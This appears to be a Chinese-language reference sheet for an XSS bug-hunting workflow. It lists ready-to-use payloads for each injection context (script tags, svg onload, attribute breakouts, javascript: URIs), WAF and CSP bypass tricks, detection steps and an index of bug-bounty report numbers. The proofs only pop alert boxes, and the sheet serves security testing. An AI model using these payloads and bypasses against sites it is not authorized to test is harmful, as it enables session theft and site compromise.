# hunt-xss · 参考

真实报告源自本仓库第二轮高价值案例（value_score≥8）。探针标记统一 `hxss9f3a2b`，PoC 用 `alert(document.domain)`。

## 按上下文的 payload

### HTML body
```
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
```

### 属性上下文（先闭合）
```
"><svg onload=alert(document.domain)>
' autofocus onfocus=alert(document.domain) x='
```
利用已有事件绑定（无需闭合标签）：注入 `onclick`/`onmouseover`（#227486、#396493）。

### JS 上下文
```
';alert(document.domain)//        </script><script>alert(document.domain)</script>
```

### URL / DOM
- `javascript:alert(document.domain)`（href/iframe src；Safari host 解析差异 #1238528）。
- `location.hash`/`search` → `innerHTML`/`document.write` sink。

## 绕过技巧（Bypasses）

- **SVG + XML 实体**使白名单/清理失效，注入 `onload`（#232174）。
- **iframe srcdoc** 加载外部脚本绕 CSP（#1342009）。
- **WAF 绕过**：`%u0022`→`"`（#227486）、大小写/换行/注释、`<svg/onload=`、事件属性无空格。
- **CSP 绕过**：JSONP 端点、`eval` + URL 片段（#921635）、AngularJS/Vue 模板表达式（原型污染→#986386）、白名单里的可控 JS。
- **属性注入 + 现有事件**：不注脚本，注 `onclick` 复用页面已绑定（#227486、#396493）。
- **富文本/Markdown sink**：`data-sourcepos`/emoji `name` 属性注入（#1398305）、SwaggerUI（#806571）。
- **Electron nodeIntegration**：XSS→RCE（#291539，桌面端）。

## Detection Patterns（怎么判，而非猜）

- **标记未编码**：`hxss9f3a2b<>"'` 原样出现在响应 = 有反射；看 `<`/`"`/`'` 哪些没被实体化，定可用上下文。
- **上下文定位**：标记落在 `<script>` 内 / 属性内 / body 内决定 payload。
- **DOM 型**：源码里 `innerHTML=`/`eval(`/`document.write(` 消费 `location.*` = DOM sink；用无头验证。
- **执行确认**：无头浏览器（Playwright）加载 PoC，`alert`/`console` 触发 = confirmed。纯文本反射不算。
- **存储型**：提交后在**另一个页面/账户视图**触发才算存储型。

## Real Reports（复现索引）

| 类型/绕过 | 报告 |
|---|---|
| SVG XML 实体 onload | 232174 |
| iframe srcdoc CSP 绕过 | 1342009 |
| WAF %u0022 + 属性事件 | 227486 / 396493 |
| javascript: host 解析 | 1238528 |
| CSP 绕过 eval/fragment | 921635 |
| 富文本 sink | 1398305 / 806571 |
| Electron→RCE | 291539 |

hunt 顺序：唯一标记探反射与编码 → 定上下文 → 该上下文最小 PoC → 被拦再上 WAF/CSP 绕过 → 无头确认执行。
